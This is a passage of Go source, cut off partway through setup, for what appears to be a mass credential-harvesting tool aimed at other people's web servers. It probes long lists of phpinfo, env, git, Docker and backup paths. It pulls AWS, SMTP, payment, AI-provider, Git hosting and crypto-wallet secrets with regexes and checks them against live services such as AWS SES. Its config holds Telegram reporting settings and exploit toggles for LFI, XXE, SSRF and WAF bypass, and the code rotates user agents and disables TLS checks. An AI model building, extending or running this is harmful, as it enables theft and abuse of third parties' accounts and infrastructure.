package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/servicequotas"
	"github.com/aws/aws-sdk-go-v2/service/ses"
	"github.com/aws/aws-sdk-go-v2/service/sesv2"
	"github.com/aws/aws-sdk-go-v2/service/sesv2/types"
	"github.com/aws/aws-sdk-go-v2/service/secretsmanager"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/ssm"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/pterm/pterm"

	secp256k1 "github.com/decred/dcrd/dcrec/secp256k1/v4"
	"golang.org/x/crypto/sha3"
)

var client *http.Client

const defaultConfigPath = "config.json"

var requestTimeoutSeconds int
var batchSize int
var checkpointFile string
var lineOffset int // skip first N non-empty lines (fleet distribution)
var lineLimit int  // process at most N non-empty lines (fleet distribution; 0 = all)

type Counters struct {
	mu               sync.Mutex
	URLsLoaded       int
	URLsFailed       int
	URLsProcessed    int
	AWSKeysValidated int
	APIsFoundTotal   int
	APIsValidated    int
	ValidSMTP        int
	// Live rate metrics — updated every second by startRateTracker()
	RequestsPerSec  float64
	ParsesPerSec    float64
	AvgRps          float64
	AvgPps          float64
	ValidHosts      int
	InvalidHosts    int
	rpsTotal        float64 // running sum for average calculation
	ppsTotal        float64
	rpsCount        int // number of samples
	ppsCount        int
	requestSnapshot int // internal — previous URLsProcessed snapshot
	parseSnapshot   int // internal — previous APIsFoundTotal snapshot
}

var globalCounters Counters

type Config struct {
	Telegram struct {
		BotToken string `json:"bot_token"`
		ChatID   string `json:"chat_id"`
	} `json:"telegram"`
	// Pindahkan fitur umum yang mengontrol proses scanning utama
	ScanningFeatures struct {
		AWSMainScan          bool `json:"aws_main_scan"`
		SMTPCredentialsScan  bool `json:"smtp_credentials_scan"`
		GitHubTokenDeepScan  bool `json:"github_token_deep_scan"`
		// Per-method scan gates — each maps to a tile in the dashboard
		JSScan               bool `json:"js_scan"`
		JSExtendedScan       bool `json:"js_extended_scan"` // scan raw page HTML for inline credentials
		PHPInfoScan          bool `json:"phpinfo_scan"`
		GitConfigScan        bool `json:"git_config_scan"`
		DockerScan           bool `json:"docker_scan"`
		ConfigFileScan       bool `json:"config_file_scan"`
		BackupFileScan       bool `json:"backup_file_scan"`
		SSHScan              bool `json:"ssh_scan"`
		NVCAScan             bool `json:"nvca_scan"`
		GPLScan              bool `json:"gpl_scan"`
		LibScan              bool `json:"lib_scan"`
	} `json:"scanning_features"`
	AWSChecks struct {
		SESQuotaCheck        bool `json:"ses_quota_check"`
		SNSLimitCheck        bool `json:"sns_limit_check"`
		FargateLimitCheck    bool `json:"fargate_limit_check"`
		FederationConsoleURL bool `json:"federation_console_url"`
	} `json:"aws_checks"`
	// Fitur yang mengontrol validasi API spesifik
	APIValidation struct {
		OpenAI      bool `json:"openai"`
		Anthropic   bool `json:"anthropic"`
		AIAll       bool `json:"ai_all"`
		Stripe      bool `json:"stripe"`
		SendGrid    bool `json:"sendgrid"`
		Mailgun     bool `json:"mailgun"`
		Twilio      bool `json:"twilio"`
		Nexmo       bool `json:"nexmo"`
		Telnyx      bool `json:"telnyx"`
		MessageBird bool `json:"messagebird"`
		Postmark    bool `json:"postmark"`
		SparkPost   bool `json:"sparkpost"`
		Mailtrap    bool `json:"mailtrap"`
		Mailjet     bool `json:"mailjet"`
		Plivo       bool `json:"plivo"`
		Tencent     bool `json:"tencent"`
		Brevo       bool `json:"brevo"`
		XSMTP       bool `json:"xsmtp"`
		Mandrill    bool `json:"mandrill"`
		MailerSend  bool `json:"mailersend"`
		GitHub      bool `json:"github"`
		GCP         bool `json:"gcp_api_key"`
		Crypto      bool `json:"crypto_wallet"`
		// Dashboard-persisted toggles (runtime skips if no check method yet)
		Heroku        bool `json:"heroku"`
		Datadog       bool `json:"datadog"`
		AWSAccess     bool `json:"aws_access"`
		SocketLabs    bool `json:"socketlabs"`
		ZeptoMail     bool `json:"zeptomail"`
		ElasticEmail  bool `json:"elasticemail"`
		Slack         bool `json:"slack"`
		Discord       bool `json:"discord"`
		Cloudflare    bool `json:"cloudflare"`
		DigitalOcean  bool `json:"digitalocean"`
		Shopify       bool `json:"shopify"`
		HubSpot       bool `json:"hubspot"`
		SSH           bool `json:"ssh"`
		MySQL         bool `json:"mysql"`
		PostgreSQL    bool `json:"postgresql"`
		Redis         bool `json:"redis"`
		CPanel        bool `json:"cpanel"`
		FTP           bool `json:"ftp"`
		WordPress     bool `json:"wordpress"`
		// Wave-9: Extended AI providers
		Gemini      bool `json:"gemini"`
		XAI         bool `json:"xai"`
		Mistral     bool `json:"mistral"`
		ElevenLabs  bool `json:"elevenlabs"`
		Groq        bool `json:"groq"`
		Perplexity  bool `json:"perplexity"`
		OpenRouter  bool `json:"openrouter"`
		HuggingFace bool `json:"huggingface"`
		Replicate   bool `json:"replicate"`
		Cohere      bool `json:"cohere"`
		TogetherAI  bool `json:"togetherai"`
		Fireworks   bool `json:"fireworks"`
		// Wave-9: Extended email providers
		Mailchimp bool `json:"mailchimp"`
		Resend    bool `json:"resend"`
		Office365 bool `json:"office365"`
		// Wave-10: Git hosting platforms
		GitLab    bool `json:"gitlab"`
		Bitbucket bool `json:"bitbucket"`
	} `json:"api_validation"`
	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
		Brevo      bool `json:"brevo"`
		XSMTP      bool `json:"xsmtp"`
		Tencent    bool `json:"tencent"`
		Mailgun    bool `json:"mailgun"`
		NewMailgun bool `json:"new_mailgun"`
		Mandrill   bool `json:"mandrill"`
		MailerSend bool `json:"mailersend"`
		GitHub     bool `json:"github"`
		Twilio     bool `json:"twilio"`
		Nexmo      bool `json:"nexmo"`
		Telnyx     bool `json:"telnyx"`
		SMTP       bool `json:"smtp"`
	} `json:"features"`
	ExploitMethods struct {
		React2Shell      bool `json:"react2shell"`
		BypassWAF        bool `json:"bypass_waf"`
		BypassMiddleware bool `json:"bypass_middleware"`
		LFI              bool `json:"lfi"`
		XXE              bool `json:"xxe"`
		SSRF             bool `json:"ssrf"`
	} `json:"exploit_methods"`
	SMTPTestEmail string `json:"smtp_test_email"`
	EmailTarget   string `json:"email_target"` // Email tujuan untuk testing pengiriman email
}

type Enhancer struct {
	client           *http.Client
	firebasePattern  *regexp.Regexp
	supabasePattern  *regexp.Regexp
	firebaseKeyPatt  *regexp.Regexp
	bearerPattern    *regexp.Regexp
	evalAtobPattern  *regexp.Regexp
	evalUnescapePatt *regexp.Regexp
	base64Candidate  *regexp.Regexp
	sitemapPattern   *regexp.Regexp
	scriptSrcPattern *regexp.Regexp
	urlParamPattern  *regexp.Regexp
}

type AWSScanner struct {
	Config           *Config
	BlacklistPattern *regexp.Regexp

	AWSAccessKeyPattern       *regexp.Regexp
	AWSSecretKeyPattern       *regexp.Regexp
	SendGridAPIKeyPattern     *regexp.Regexp
	BrevoAPIKeyPattern        *regexp.Regexp
	XSMTPAPIKeyPattern        *regexp.Regexp
	TencentAccessKeyPattern   *regexp.Regexp
	MailgunAPIKeyPattern      *regexp.Regexp
	MandrillAppAPIKeyPattern  *regexp.Regexp
	MailerSendAPIKeyPattern   *regexp.Regexp
	NewMailgunAPIKeyPattern   *regexp.Regexp
	AWSRandomPattern          *regexp.Regexp
	AWSAccessKeyPatternInfo   *regexp.Regexp
	AWSSecretKeyPatternInfo   *regexp.Regexp
	SendGridAPIKeyPatternInfo *regexp.Regexp
	MailgunAPIKeyPatternInfo  *regexp.Regexp
	TwilioSIDPatternInfo      *regexp.Regexp
	TwilioAuthPatternInfo        *regexp.Regexp
	TwilioAuthPatternV2Info      *regexp.Regexp
	TwilioEncodePatternInfo      *regexp.Regexp
	NexmoApiPatternInfo          *regexp.Regexp
	NexmoSecretPatternInfo       *regexp.Regexp
	TelnyxApiPatternInfo         *regexp.Regexp
	SMSGatewayPattern            *regexp.Regexp
	DBCredentialsPattern         *regexp.Regexp
	StripePattern                *regexp.Regexp
	OpenAIAPIPattern             *regexp.Regexp
	AnthropicPattern             *regexp.Regexp
	MessageBirdPattern           *regexp.Regexp
	MailValPattern               *regexp.Regexp
	SMTPHostPattern              *regexp.Regexp
	SMTPPortPattern              *regexp.Regexp
	SMTPUserPattern              *regexp.Regexp
	SMTPPassPattern              *regexp.Regexp
	SMTPFromPattern              *regexp.Regexp
	AWSSMTPHostPattern           *regexp.Regexp

	AliyunAccessKeyPattern *regexp.Regexp
	AliyunSecretKeyPattern *regexp.Regexp

	AWSSessionTokenPattern *regexp.Regexp
	AWSSESUserPattern      *regexp.Regexp
	AWSSecretV2KeyPattern  *regexp.Regexp

	// ── New (Wave-5) credential patterns ──────────────────────────────────
	PostmarkAPIKeyPattern   *regexp.Regexp
	MailjetAPIKeyPattern    *regexp.Regexp

	// ── Wave-6: GitHub, GCP, crypto wallet ────────────────────────────────
	GitHubTokenPattern *regexp.Regexp
	GCPAPIKeyPattern   *regexp.Regexp
	CryptoWalletPattern *regexp.Regexp

	// SSH private key detection
	SSHPrivateKeyPattern *regexp.Regexp

	// ── Wave-8: npm auth token (.npmrc) ───────────────────────────────
	NPMAuthTokenPattern *regexp.Regexp

	// ── Wave-7: Slack, Discord, Cloudflare, DigitalOcean, Shopify, HubSpot, Heroku, Datadog ──
	SlackBotTokenPattern     *regexp.Regexp
	DiscordBotTokenPattern   *regexp.Regexp
	CloudflareTokenPattern   *regexp.Regexp
	DigitalOceanTokenPattern *regexp.Regexp
	ShopifyTokenPattern      *regexp.Regexp
	HubSpotTokenPattern      *regexp.Regexp
	HerokuAPIKeyPattern      *regexp.Regexp
	DatadogAPIKeyPattern     *regexp.Regexp

	// ── Wave-9: Extended AI providers ─────────────────────────────────────────
	GeminiAPIKeyPattern      *regexp.Regexp
	XAIAPIKeyPattern         *regexp.Regexp
	MistralAPIKeyPattern     *regexp.Regexp
	ElevenLabsAPIKeyPattern  *regexp.Regexp
	GroqAPIKeyPattern        *regexp.Regexp
	PerplexityAPIKeyPattern  *regexp.Regexp
	OpenRouterAPIKeyPattern  *regexp.Regexp
	HuggingFaceAPIKeyPattern *regexp.Regexp
	ReplicateAPIKeyPattern   *regexp.Regexp
	CohereAPIKeyPattern      *regexp.Regexp
	TogetherAIAPIKeyPattern  *regexp.Regexp
	FireworksAPIKeyPattern   *regexp.Regexp

	// ── Wave-9: Extended email providers ──────────────────────────────────────
	MailchimpAPIKeyPattern *regexp.Regexp
	ResendAPIKeyPattern    *regexp.Regexp

	// ── Wave-10: Git hosting platforms ────────────────────────────────────────
	GitLabTokenPattern              *regexp.Regexp
	BitbucketAppPasswordPattern     *regexp.Regexp
	BitbucketContextPattern         *regexp.Regexp

	// SMTP Service Patterns
	SocketLabsSMTPPattern   *regexp.Regexp
	SparkPostSMTPPattern    *regexp.Regexp
	PostmarkSMTPPattern     *regexp.Regexp
	RackspaceSMTPPattern    *regexp.Regexp
	MailjetSMTPPattern      *regexp.Regexp
	MailgunSMTPPattern      *regexp.Regexp
	MailgunEUSMTPPattern    *regexp.Regexp
	ZeptoMailSMTPPattern    *regexp.Regexp
	GmailSMTPPattern        *regexp.Regexp
	MandrillSMTPPattern     *regexp.Regexp
	Office365SMTPPattern    *regexp.Regexp
	BrevoSMTPPattern        *regexp.Regexp
	ElasticEmailSMTPPattern *regexp.Regexp
	SendinBlueSMTPPattern   *regexp.Regexp
	KagoyaSMTPPattern       *regexp.Regexp

	DefaultRegion string
	PHPInfoPaths  []string
	EnvPaths      []string

	ValidKeyLimits sync.Map
	KnownKeys      sync.Map
	SentTelegrams  sync.Map // Tracking pesan telegram yang sudah dikirim
	VisitedURLs    sync.Map // Tracking URL yang sudah di-scan untuk prevent duplicate
	TempDir        string

	ProgressBar *pterm.ProgressbarPrinter
}

var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)

var _uaPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
}
var _uaIdx int64

func nextUA() string {
	return _uaPool[atomic.AddInt64(&_uaIdx, 1)%int64(len(_uaPool))]
}

func tryDecodeBase64(s string) string {
	re := regexp.MustCompile(`[^a-zA-Z0-9+/=_-]`)
	cleaned := re.ReplaceAllString(s, "")

	if len(cleaned) < 40 {
		return ""
	}

	standardized := strings.ReplaceAll(cleaned, "-", "+")
	standardized = strings.ReplaceAll(standardized, "_", "/")

	switch len(standardized) % 4 {
	case 2:
		standardized += "=="
	case 3:
		standardized += "="
	}

	decodedBytes, err := base64.StdEncoding.DecodeString(standardized)
	if err == nil {
		if isPrintableText(decodedBytes) {
			return string(decodedBytes)
		}
	}
	return ""
}

func isPrintableText(data []byte) bool {
	if len(data) == 0 {
		return false
	}
	nonPrintableCount := 0
	for _, b := range data {
		if (b < 32 || b > 126) && b != 9 && b != 10 && b != 13 {
			nonPrintableCount++
		}
	}
	return float64(nonPrintableCount)/float64(len(data)) < 0.3
}

func countLines(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	buf := make([]byte, 32*1024)
	count := 0
	lineSep := []byte{'\n'}

	for {
		c, err := file.Read(buf)
		count += bytes.Count(buf[:c], lineSep)

		switch {
		case err == io.EOF:
			return count, nil
		case err != nil:
			return count, err
		}
	}
}

func loadConfig(path string) (*Config, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	// Menggunakan json.Unmarshal untuk memuat konfigurasi
	if err := json.Unmarshal(b, &cfg); err != nil {
		return nil, err
	}
	// Perlu juga memuat konfigurasi lama untuk compatibility
	// (Walaupun di versi ini kita hanya fokus pada struktur baru,
	// ini penting jika ada field yang terpisah)
	var tempConfig map[string]interface{}
	if err := json.Unmarshal(b, &tempConfig); err != nil {
		return nil, err
	}
	// Beberapa fitur lama di 'features' perlu di mapping ke struct baru jika ada
	// Contoh: jika fitur lama masih ada di config.json dan perlu dipertahankan
	// (meskipun di JSON baru kita sudah memisahkannya)
	if f, ok := tempConfig["features"].(map[string]interface{}); ok {
		if val, ok := f["brevo"].(bool); ok {
			cfg.Features.Brevo = val
		}
		// Ulangi untuk fitur lama lainnya jika diperlukan
	}

	return &cfg, nil
}

func NewEnhancer(client *http.Client) *Enhancer {
	return &Enhancer{
		client:           client,
		firebasePattern:  regexp.MustCompile(`(?i)apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		supabasePattern:  regexp.MustCompile(`(?i)SUPABASE_URL\s*[:=]\s*["'](https?://[\w.-]+)/?\b`),
		firebaseKeyPatt:  regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		bearerPattern:    regexp.MustCompile(`(?i)Bearer\s+([A-Za-z0-9\-_.=]{20,300})`),
		evalAtobPattern:  regexp.MustCompile(`eval\(atob\(['\"]([A-Za-z0-9\+/=_-]{20,})['\"]\)\)`),
		evalUnescapePatt: regexp.MustCompile(`eval\(unescape\(['\"](%[0-9A-Fa-f]{2}|\\x[0-9A-Fa-f]{2})+['\"]\)\)`),
		base64Candidate:  regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`),
		sitemapPattern:   regexp.MustCompile(`(?i)<loc>(https?://[^<]+)</loc>`),
		scriptSrcPattern: regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+)["']`),
		urlParamPattern:  regexp.MustCompile(`[?&]([A-Za-z0-9_\-\.]+)=([A-Za-z0-9%_\-\./:+@\s]{8,200})`),
	}
}

func NewAWSScanner(configPath string) *AWSScanner {
	cfg, err := loadConfig(configPath)
	if err != nil {
		pterm.Error.Printf("Failed to load config: %v. Make sure config.json exists.\n", err)
		os.Exit(1)
	}

	client = &http.Client{
		// Per-request context already enforces requestTimeoutSeconds; this is a
		// backstop for any request that escapes context cancellation.
		Timeout: time.Duration(requestTimeoutSeconds+2) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: (&net.Dialer{
				Timeout: 3 * time.Second,
			}).DialContext,
			TLSHandshakeTimeout: 4 * time.Second,
			DisableKeepAlives:   true,
		},
	}

	tempDir := "temp_repos"
	os.MkdirAll(tempDir, 0755)

	blacklist := []string{"cloudflare", "bootstrap", "jquery", "/wp-content/", "/jwplayer.js", "awstatic"}
	blacklistPattern := regexp.MustCompile(strings.Join(blacklist, "|"))

	phpinfoPaths := []string{
		"/info",
		"/phpinfo",
		"/phpinfo.php",
		"/info.php",
		"/_profiler/phpinfo",
		"/php.php",
		"/test.php",
		"/i.php",
		"/asdf.php",
		"/phpversion.php",
		"/temp.php",
		"/old/phpinfo.php",
		"/infophp.php",
		"/server/php",
		"/php/info.php",
		"/php/phpinfo.php",
		"/test/phpinfo.php",
		"/demo/phpinfo.php",
		"/site/phpinfo.php",
		"/tmp/phpinfo.php",
		"/dev/phpinfo.php",
		"/local/phpinfo.php",
		"/backend/phpinfo.php",
		"/blog/phpinfo.php",
		"/_profiler/info",
		"/server-status",
		"/index.php?page=phpinfo",
		"/index.php?view=phpinfo",
		"/index.php?action=phpinfo",
		"/index.php?do=phpinfo",
		"/index.php?mode=phpinfo",
		"/index.php?phpinfo=1",
		"/index.php?=phpinfo()",
		"/index.php?=-phpinfo()",
		"/?=phpinfo",
		"/?phpinfo=1",
		"/?page=phpinfo",
		"/test/php.php",
		"/test/info.php",
		"/test/index.php",
		"/test/testing.php",
		"/testing/phpinfo.php",
		"/testing/info.php",
		"/testing/php.php",
		"/php-info.php",
		"/php_info.php",
		"/info/php.php",
		"/info/info.php",
		"/info/phpinfo.php",
		"/phpinfo/info.php",
		"/phpinfo/test.php",
		"/server-info.php",
		"/server_info.php",
		"/tests/phpinfo.php",
		"/tests/info.php",
		"/admin/phpinfo.php",
		"/admin/info.php",
		"/admin/php.php",
		"/admin/php_info.php",
		"/admin/php-info.php",
		"/administrator/phpinfo.php",
		"/administrator/info.php",
		"/web/phpinfo.php",
		"/web/info.php",
		"/web/php.php",
		"/_inc/phpinfo.php",
		"/includes/phpinfo.php",
		"/include/phpinfo.php",
		"/inc/phpinfo.php",
		"/core/phpinfo.php",
		"/core/info.php",
		"/app/phpinfo.php",
		"/apps/phpinfo.php",
		"/upload/phpinfo.php",
		"/uploads/phpinfo.php",
		"/exported/phpinfo.php",
		"/backup/phpinfo.php",
		"/back/phpinfo.php",
		"/bak/phpinfo.php",
		"/.backup/phpinfo.php",
		"/_backup/phpinfo.php",
		"/beta/phpinfo.php",
		"/old/info.php",
		"/2020/phpinfo.php",
		"/2021/phpinfo.php",
		"/2022/phpinfo.php",
		"/2023/phpinfo.php",
		"/2024/phpinfo.php",
		"/v1/phpinfo.php",
		"/v2/phpinfo.php",
		"/v3/phpinfo.php",
		"/api/phpinfo.php",
		"/api/info.php",
		"/api/v1/phpinfo.php",
		"/api/v2/phpinfo.php",
		"/apis/phpinfo.php",
		"/site-info.php",
		"/server.php",
		"/host.php",
		"/host-info.php",
		"/status.php",
		"/system.php",
		"/system/info.php",
		"/sys/info.php",
		"/sys/phpinfo.php",
		"/.php",
		"/1.php",
		"/x.php",
		"/xx.php",
		"/xxx.php",
		"/db.php",
		"/database.php",
		"/home.php",
		"/default.php",
		"/conf.php",
		"/config.php",
		"/configuration.php",
		"/_test.php",
		"/_phpinfo.php",
		"/__test.php",
		"/__phpinfo.php",
	}
	envPaths := loadEnvPaths()

	return &AWSScanner{
		Config:                       cfg,
		BlacklistPattern:             blacklistPattern,
		AWSAccessKeyPattern:          regexp.MustCompile(`['"](AKIA[0-9A-Z]{16})['"]`),
		AWSSecretKeyPattern:          regexp.MustCompile(`['"]([A-Za-z0-9/+=]{40})['"]`),
		SendGridAPIKeyPattern:        regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}`),
		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-f0-9]{64}-[a-zA-Z0-9]{16}`),
		TencentAccessKeyPattern:      regexp.MustCompile(`AKID[a-zA-Z0-9]{32}`),
		// Legacy Mailgun keys start with "key-"; newer private API keys are
		// 32-char hex or UUID-style (covered by NewMailgunAPIKeyPattern).
		// The context fallback catches MAILGUN_API_KEY=<anything> in env files.
		MailgunAPIKeyPattern:         regexp.MustCompile(`(?:key-[a-z0-9]{32}|(?i)(?:MAILGUN[_\-]?(?:API[_\-]?)?(?:KEY|SECRET|TOKEN)|MG_API_KEY)["'\s:=]+([a-zA-Z0-9\-]{20,55}))`),
		MandrillAppAPIKeyPattern:     regexp.MustCompile(`(?i)mandrill.{0,40}\b([A-Za-z0-9_-]{22})\b`),
		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn\.[a-zA-Z0-9_\-]{40,100}`),
		NewMailgunAPIKeyPattern: regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
		TwilioSIDPatternInfo:    regexp.MustCompile(`AC[0-9a-fA-F]{32}`),
		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
		TwilioAuthPatternV2Info:      regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
		NexmoApiPatternInfo:          regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?([a-zA-Z0-9]{8})["\']?`),
		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{8,25})["\']?`),
		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[0-9A-Za-z_\-]{55}`),
		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
		AWSSMTPHostPattern:           regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
		DefaultRegion:                "us-east-1",
		AWSAccessKeyPatternInfo:      regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`),
		AWSSecretKeyPatternInfo:      regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
		SendGridAPIKeyPatternInfo: regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
		MailgunAPIKeyPatternInfo:  regexp.MustCompile(`\bkey-[a-z0-9]{32}\b`),
		// Stripe key formats: secret (sk_*) and restricted (rk_*) — live and test variants.
		// pk_ (publishable) keys are intentionally excluded: they cannot authenticate
		// against /v1/balance and only produce wasted 403 roundtrips.
		StripePattern:                regexp.MustCompile(`(?:sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{24,128}`),
		// OpenAI: modern sk-proj-* / sk-o1-* / sk-svcacct-* keys and long generic sk- keys.
		// Branch1: T3BlbkFJ marker (modern project keys) — {20,} prefix chars + T3BlbkFJ + {20,} suffix.
		// Branch2: long tail without marker — {20,} prefix + {28,} suffix = minimum 48 chars after "sk-".
		// NOTE: classic 48-char legacy keys (sk- + 45 chars) do NOT match branch2 (need 48 not 45).
		// They can only match if a future format has the T3BlbkFJ marker or if the suffix is ≥28 chars.
		OpenAIAPIPattern:             regexp.MustCompile(`sk-(?:(?:proj|svcacct|admin)-[A-Za-z0-9_-]{58,74}T3BlbkFJ[A-Za-z0-9_-]{58,74}|[a-zA-Z0-9]{20}T3BlbkFJ[a-zA-Z0-9]{20})`),
		// Anthropic key format: sk-ant-api<N>-<payload> where payload is ≥86 base64url chars.
		// Two explicit alternatives prevent the regex engine from silently absorbing "api03-"
		// into the character-class run (all chars in [A-Za-z0-9_-]) when the optional group
		// is skipped, which would lower the effective minimum by 6 chars.
		//   Alt 1: with api\d+- prefix — {86,} chars of payload after the separator
		//   Alt 2: bare sk-ant- (no api prefix) — require {92,} to rule out truncated keys
		// TruffleHog: (?:api03|admin01) prefixes confirmed; payload is 93 chars + 'AA' suffix
		AnthropicPattern:             regexp.MustCompile(`sk-ant-(?:api\d+|admin\d+)-[A-Za-z0-9_-]{86,}`),
		MessageBirdPattern:           regexp.MustCompile(`(?:live|test)_[a-zA-Z0-9]{25}`),
		PHPInfoPaths:                 phpinfoPaths,
		EnvPaths:                     envPaths,
		SMTPHostPattern:              regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|SMTP_ADDRESS|EMAIL_SERVER|SMTP_SERVER)\s*[:=]\s*([^\s'"]+)`),
		SMTPPortPattern:              regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[:=]\s*([0-9]+)`),
		SMTPUserPattern:              regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?|EMAIL_HOST_USER|SMTP_USER_NAME)\s*[:=]\s*([^\s'"]+)`),
		SMTPPassPattern:              regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|EMAIL_HOST_PASSWORD)\s*[:=]\s*([^\s'"]+)`),
		SMTPFromPattern:              regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM)\s*[:=]\s*([^\s'"]+@[^\s'"]+)`),
		SMSGatewayPattern:            regexp.MustCompile(`(?i)(?P<service>twilio|vonage|aliyun|smsastral|infobip|nexmo|clickatell|talk2all).*?(?:api[_-]?key|login|username)[\s:=]+(?P<username>[A-Za-z0-9_-]+).*?(?:secret|password|token)[\s:=]+(?P<password>[A-Za-z0-9_-]+)`),
		DBCredentialsPattern:         regexp.MustCompile(`(?i)(?P<db>mysql|maria(?:db)?|mongodb|phpmyadmin)[\s:]*://(?P<username>[a-zA-Z0-9_.+-]+):(?P<password>[^@]+)@(?P<host>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::(?P<port>\d+))?`),
		MailValPattern:               regexp.MustCompile(`(?i)(?P<service>zerobounce|neverbounce|bouncer)[\s:=]+(?P<apikey>[A-Za-z0-9_-]{16,64})`),
		AliyunAccessKeyPattern:       regexp.MustCompile(`(?i)LTAI[A-Z0-9]{16}`),
		AliyunSecretKeyPattern:       regexp.MustCompile(`(?i)[A-Za-z0-9]{30}`),
		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+=]{40})<\/td>`),

		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{100,})['"]`),
		AWSSESUserPattern:      regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),

		// ── New (Wave-5) credential patterns ──────────────────────────────
		// Postmark server token (UUID-ish)
		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)postmark[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
		// Mailjet — API key:secret pair (public and private keys are both 32 alphanum chars)
		MailjetAPIKeyPattern: regexp.MustCompile(`(?i)(?:mailjet[^\n]*(?:api[_-]?(?:key|secret)|public|private|secret)|MJ_APIKEY_(?:PUBLIC|PRIVATE))[\s:=]+([A-Za-z0-9]{32})`),

		// SMTP Service Patterns
		SocketLabsSMTPPattern:   regexp.MustCompile(`smtp\.socketlabs\.com`),
		SparkPostSMTPPattern:    regexp.MustCompile(`smtp\.sparkpostmail\.com`),
		PostmarkSMTPPattern:     regexp.MustCompile(`smtp\.postmarkapp\.com`),
		RackspaceSMTPPattern:    regexp.MustCompile(`secure\.emailsrvr\.com`),
